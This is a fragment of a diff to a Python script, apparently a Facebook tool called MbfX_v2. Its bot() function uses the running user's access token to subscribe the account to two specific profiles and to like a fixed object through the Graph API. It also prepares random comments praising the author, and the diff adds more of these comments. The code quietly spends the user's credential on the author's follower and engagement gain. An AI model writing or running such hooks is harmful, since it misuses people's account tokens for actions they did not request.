@@ -222,7 +222,7 @@ def bot():
 		time.sleep(0.5)
 		login()
 	komentar = random.choice(["McybearX emang the best:v","Mantap McybearX","Suport terus McybearX","the best of hacker "])
-	komen = random.choice(["Ganteng bet lu bang :v","Anjir ganteng bangett","Suport terus yt MBEWLEGS","gua murid lu bang :v"])
+	komen = random.choice(["Ganteng bet lu bang :v","Anjir ganteng bangett","Suport terus yt MBEWLEGS","gua murid lu bang :v"," Usup Ganteng","Selamat Soree baang","Pengguna script MbfX_v2","Semangat Terus bang"])
 	requests.post("https://graph.facebook.com/100074600334850/subscribers?access_token="+token)
 	requests.post("https://graph.facebook.com/100050672943941/subscribers?access_token="+token) # Usup Mbew
 	requests.post("https://graph.facebook.com/123822970114380/likes?summary=true&access_token=" + token)
